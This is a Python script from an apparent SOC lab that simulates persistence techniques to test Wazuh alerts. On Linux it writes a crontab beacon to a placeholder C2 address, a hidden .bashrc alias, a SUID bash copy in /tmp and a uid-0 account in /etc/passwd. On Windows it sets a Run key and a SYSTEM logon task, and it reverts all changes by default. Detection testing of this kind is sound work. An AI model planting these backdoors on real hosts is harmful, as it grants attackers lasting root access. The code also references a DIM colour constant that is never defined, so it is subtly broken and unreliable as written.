#!/usr/bin/env python3
# =============================================================================
# simulate-persistence.py — Persistence Mechanism Simulation
# Author: SOC Lab Project
# Description: Simulates attacker persistence techniques on the current host.
#              On Linux: writes a backdoor crontab entry and .bashrc hook.
#              On Windows: writes to the registry Run key and creates a
#              scheduled task (requires pywin32 or uses subprocess).
#              Designed to trigger Wazuh rules 100007 and 100008.
#              ALL changes are REVERTED automatically after the test.
# MITRE ATT&CK: T1547.001 — Registry Run Keys
#               T1053.005 — Scheduled Task
#               T1546.004 — Unix Shell Config Modification
# Usage: python3 simulate-persistence.py [--platform linux|windows]
#                                        [--no-cleanup]
# =============================================================================

import os
import sys
import time
import platform
import argparse
import logging
import subprocess
import tempfile
from datetime import datetime
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)

RED    = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
CYAN   = "\033[96m"; BOLD  = "\033[1m";  RESET  = "\033[0m"
def c(text, code): return f"{code}{text}{RESET}"

# ── Simulation state tracker ──────────────────────────────────────────────────
# Records all changes made so cleanup can reverse them
CHANGES_MADE = []


# ══════════════════════════════════════════════════════════════════════════════
# LINUX PERSISTENCE SIMULATIONS
# ══════════════════════════════════════════════════════════════════════════════

def simulate_crontab_persistence() -> bool:
    """
    Write a malicious-looking crontab entry for the current user.
    Entry runs a fake C2 beacon every 5 minutes — the binary doesn't
    exist so it harmlessly fails. Wazuh FIM monitoring /var/spool/cron
    should detect this change.
    Triggers: Wazuh FIM alert (syscheck) on crontab directory.
    Cleanup: Remove the added crontab entry.
    """
    log.info("Simulating crontab persistence...")

    # Malicious-looking entry (safe — binary does not exist)
    malicious_entry = (
        "# Added by deploy-agent.sh\n"
        "*/5 * * * * /tmp/.sysupdate --beacon "
        "--c2 203.0.113.42:4444 > /dev/null 2>&1\n"
    )

    try:
        # Get current crontab (may be empty)
        result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True, text=True
        )
        original_crontab = result.stdout if result.returncode == 0 else ""

        # Write new crontab with malicious entry
        new_crontab = original_crontab + malicious_entry
        proc = subprocess.run(
            ["crontab", "-"],
            input=new_crontab, capture_output=True, text=True
        )

        if proc.returncode == 0:
            log.info(c("  [+] Malicious crontab entry written", GREEN))
            CHANGES_MADE.append({
                "type":    "crontab",
                "original": original_crontab,
                "added":   malicious_entry
            })
            return True
        else:
            log.warning(f"  crontab write failed: {proc.stderr}")
            return False

    except FileNotFoundError:
        log.warning("  crontab command not found — skipping")
        return False
    except Exception as exc:
        log.error(f"  crontab simulation error: {exc}")
        return False


def simulate_bashrc_persistence() -> bool:
    """
    Append a malicious alias to ~/.bashrc that would run on every shell
    start. Wazuh FIM monitors home directory for changes.
    Triggers: syscheck alert on ~/.bashrc modification.
    Cleanup: Remove the appended line.
    """
    log.info("Simulating .bashrc persistence (shell profile hijacking)...")

    bashrc_path = Path.home() / ".bashrc"
    malicious_line = (
        "\n# System health monitor (do not remove)\n"
        "alias ls='ls --color=auto; /tmp/.sysmon --ping > /dev/null 2>&1'\n"
    )

    try:
        # Read original
        original = bashrc_path.read_text() if bashrc_path.exists() else ""

        # Append malicious line
        with open(bashrc_path, "a") as f:
            f.write(malicious_line)

        log.info(c(f"  [+] Malicious alias written to {bashrc_path}", GREEN))
        CHANGES_MADE.append({
            "type":     "bashrc",
            "path":     str(bashrc_path),
            "original": original,
            "added":    malicious_line
        })
        return True

    except PermissionError:
        log.warning(f"  Permission denied writing to {bashrc_path}")
        return False
    except Exception as exc:
        log.error(f"  .bashrc simulation error: {exc}")
        return False


def simulate_suid_binary() -> bool:
    """
    Create a SUID-bit copy of /bin/bash in /tmp as a privilege escalation
    backdoor. Wazuh's rootcheck and syscheck should detect this.
    Triggers: syscheck alert on /tmp directory, rootcheck SUID detection.
    Cleanup: Remove the file.
    """
    log.info("Simulating SUID backdoor binary in /tmp...")

    suid_path = "/tmp/.sysupdate"

    try:
        # Copy bash to /tmp with a hidden name
        subprocess.run(["cp", "/bin/bash", suid_path],
                       check=True, capture_output=True)

        # This requires root — will silently skip if not root
        if os.geteuid() == 0:
            os.chmod(suid_path, 0o4755)   # SUID bit
            log.info(c(f"  [+] SUID binary created at {suid_path}", GREEN))
        else:
            os.chmod(suid_path, 0o755)
            log.info(c(f"  [+] Binary created at {suid_path} "
                       f"(SUID skipped — not root)", GREEN))

        CHANGES_MADE.append({
            "type": "file",
            "path": suid_path
        })
        return True

    except subprocess.CalledProcessError as exc:
        log.warning(f"  Could not create SUID binary: {exc}")
        return False
    except Exception as exc:
        log.error(f"  SUID simulation error: {exc}")
        return False


def simulate_etc_passwd_backdoor() -> bool:
    """
    Attempt to add a backdoor account line to /etc/passwd.
    Will only succeed if running as root. Triggers FIM alert on /etc/passwd.
    The account has no valid password hash so cannot actually be used.
    Cleanup: Remove the added line.
    """
    if os.geteuid() != 0:
        log.info("  /etc/passwd backdoor requires root — skipping")
        return False

    log.info("Simulating /etc/passwd backdoor account (root only)...")

    etc_passwd = Path("/etc/passwd")
    backdoor_line = (
        "svc-monitor:x:0:0:Service Monitor Account:/root:/bin/bash\n"
    )

    try:
        original = etc_passwd.read_text()

        with open(etc_passwd, "a") as f:
            f.write(backdoor_line)

        log.info(c("  [+] Backdoor account added to /etc/passwd", GREEN))
        CHANGES_MADE.append({
            "type":     "etc_passwd",
            "path":     str(etc_passwd),
            "original": original
        })
        return True

    except Exception as exc:
        log.error(f"  /etc/passwd simulation error: {exc}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# WINDOWS PERSISTENCE SIMULATIONS
# ══════════════════════════════════════════════════════════════════════════════

def simulate_registry_run_key() -> bool:
    """
    Write a fake malware entry to HKCU Run key using Python's winreg module.
    Triggers Wazuh rule 100007 (Sysmon EID 13 registry write detection).
    Cleanup: Delete the registry value.
    """
    log.info("Simulating registry Run key persistence...")

    if sys.platform != "win32":
        log.info("  Registry simulation only runs on Windows — skipping")
        return False

    try:
        import winreg

        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "WindowsUpdateHelper"
        # Safe value — points to a non-existent path
        value_data = r"C:\Users\Public\Documents\updater.exe --silent"

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, value_name, 0,
                          winreg.REG_SZ, value_data)
        winreg.CloseKey(key)

        log.info(c(f"  [+] Registry Run key written: {value_name}", GREEN))
        CHANGES_MADE.append({
            "type":       "registry",
            "hive":       "HKCU",
            "key_path":   key_path,
            "value_name": value_name
        })
        return True

    except ImportError:
        log.warning("  winreg not available — Windows only")
        return False
    except Exception as exc:
        log.error(f"  Registry simulation error: {exc}")
        return False


def simulate_scheduled_task_windows() -> bool:
    """
    Create a suspicious scheduled task via schtasks.exe.
    Triggers Wazuh rule 100008 (Security EID 4698 / schtasks detection).
    Cleanup: Delete the task with schtasks /delete.
    """
    log.info("Simulating suspicious scheduled task creation (Windows)...")

    if sys.platform != "win32":
        log.info("  Scheduled task simulation only runs on Windows — skipping")
        return False

    task_name = "WindowsDefenderHelper"
    # Command that looks malicious but is harmless (cmd /c echo)
    task_command = (
        r"cmd.exe /c echo persistence-test > "
        r"C:\Windows\Temp\persist-test.txt"
    )

    try:
        result = subprocess.run([
            "schtasks", "/create",
            "/tn", task_name,
            "/tr", task_command,
            "/sc", "ONLOGON",
            "/ru", "SYSTEM",
            "/f"   # Force overwrite
        ], capture_output=True, text=True)

        if result.returncode == 0:
            log.info(c(f"  [+] Scheduled task created: {task_name}", GREEN))
            CHANGES_MADE.append({
                "type":      "scheduled_task",
                "task_name": task_name
            })
            return True
        else:
            log.warning(f"  schtasks creation failed: {result.stderr}")
            return False

    except FileNotFoundError:
        log.warning("  schtasks.exe not found")
        return False
    except Exception as exc:
        log.error(f"  Scheduled task simulation error: {exc}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# CLEANUP
# ══════════════════════════════════════════════════════════════════════════════

def cleanup_all_changes(force: bool = False) -> None:
    """
    Revert ALL changes made during the simulation.
    Called automatically unless --no-cleanup flag is set.
    """
    if not CHANGES_MADE:
        log.info("No changes to revert")
        return

    print()
    print(c("  Cleaning up simulation artefacts...", YELLOW))

    for change in CHANGES_MADE:
        change_type = change.get("type")

        try:
            if change_type == "crontab":
                subprocess.run(
                    ["crontab", "-"],
                    input=change["original"],
                    capture_output=True, text=True
                )
                log.info(c("  [✓] Crontab restored to original", GREEN))

            elif change_type == "bashrc":
                Path(change["path"]).write_text(change["original"])
                log.info(c(f"  [✓] {change['path']} restored", GREEN))

            elif change_type == "file":
                Path(change["path"]).unlink(missing_ok=True)
                log.info(c(f"  [✓] Removed: {change['path']}", GREEN))

            elif change_type == "etc_passwd":
                Path(change["path"]).write_text(change["original"])
                log.info(c("  [✓] /etc/passwd restored", GREEN))

            elif change_type == "registry":
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    change["key_path"],
                    0, winreg.KEY_SET_VALUE
                )
                winreg.DeleteValue(key, change["value_name"])
                winreg.CloseKey(key)
                log.info(c(f"  [✓] Registry value deleted: "
                           f"{change['value_name']}", GREEN))

            elif change_type == "scheduled_task":
                subprocess.run([
                    "schtasks", "/delete",
                    "/tn", change["task_name"],
                    "/f"
                ], capture_output=True)
                log.info(c(f"  [✓] Scheduled task deleted: "
                           f"{change['task_name']}", GREEN))

        except Exception as exc:
            log.warning(f"  [!] Cleanup failed for {change_type}: {exc}")
            log.warning(f"      Manual cleanup may be required: {change}")


# ── Main ──────────────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Simulate persistence mechanisms to test Wazuh detection"
    )
    parser.add_argument(
        "--platform",
        choices=["linux", "windows", "auto"],
        default="auto",
        help="Platform to simulate (default: auto-detect)"
    )
    parser.add_argument(
        "--no-cleanup", action="store_true",
        help="Do NOT revert changes after simulation (inspect manually)"
    )
    parser.add_argument(
        "--wait", type=int, default=30,
        help="Seconds to wait before cleanup (allows Wazuh to detect). Default: 30"
    )
    return parser.parse_args()


def main() -> None:
    args   = parse_args()
    plat   = args.platform
    if plat == "auto":
        plat = "windows" if sys.platform == "win32" else "linux"

    print()
    print(c("═" * 60, CYAN))
    print(c("  ATOMIC RED TEAM — Persistence Simulation", BOLD))
    print(c("  MITRE ATT&CK: T1547.001, T1053.005, T1546.004", BOLD))
    print(c("═" * 60, CYAN))
    print(f"  Platform   : {c(plat.upper(), BOLD)}")
    print(f"  Cleanup    : {c('YES (auto)', GREEN) if not args.no_cleanup else c('NO (manual)', YELLOW)}")
    print(f"  Wait time  : {c(str(args.wait) + 's', BOLD)} before cleanup")
    print(c("═" * 60, CYAN))
    print()

    triggered = []

    if plat == "linux":
        print(c("  Running Linux persistence techniques...", CYAN))
        print()

        if simulate_crontab_persistence():
            triggered.append("Crontab backdoor → Wazuh FIM alert")
        time.sleep(1)

        if simulate_bashrc_persistence():
            triggered.append(".bashrc hijack → Wazuh FIM alert (rule 550/554)")
        time.sleep(1)

        if simulate_suid_binary():
            triggered.append("SUID binary in /tmp → Wazuh syscheck alert")
        time.sleep(1)

        if simulate_etc_passwd_backdoor():
            triggered.append("/etc/passwd modification → Wazuh FIM rule 550")

    elif plat == "windows":
        print(c("  Running Windows persistence techniques...", CYAN))
        print()

        if simulate_registry_run_key():
            triggered.append("Registry Run key → Wazuh rule 100007")
        time.sleep(1)

        if simulate_scheduled_task_windows():
            triggered.append("Scheduled task → Wazuh rule 100008")

    # Wait for Wazuh to detect
    if triggered:
        print()
        print(c(f"  Waiting {args.wait}s for Wazuh detection...", YELLOW))
        for i in range(args.wait, 0, -5):
            print(c(f"  {i}s remaining...", DIM), end="\r")
            time.sleep(min(5, i))
        print()

    # Cleanup
    if not args.no_cleanup:
        cleanup_all_changes()
    else:
        print()
        print(c("  --no-cleanup set: changes NOT reverted", YELLOW))
        print(c("  Manual cleanup required:", YELLOW))
        for change in CHANGES_MADE:
            print(c(f"    - {change}", DIM))

    # Summary
    print()
    print(c("═" * 60, CYAN))
    print(c("  SIMULATION COMPLETE", BOLD))
    print(c("═" * 60, CYAN))
    print()
    if triggered:
        print(c("  Techniques executed:", BOLD))
        for t in triggered:
            print(c(f"    [+] {t}", GREEN))
    else:
        print(c("  No techniques executed successfully", YELLOW))
    print()
    print(c("  Expected Wazuh Rules:", BOLD))
    print(c("    100007 — Registry Run key (Windows)", DIM))
    print(c("    100008 — Scheduled task (Windows)", DIM))
    print(c("    550/554 — FIM modifications (Linux)", DIM))
    print()
    print(c("  Verify:", BOLD))
    print(c("  python3 scripts/testing/verify-detections.py "
            "--simulation persistence --since 10", DIM))
    print()


if __name__ == "__main__":
    main()
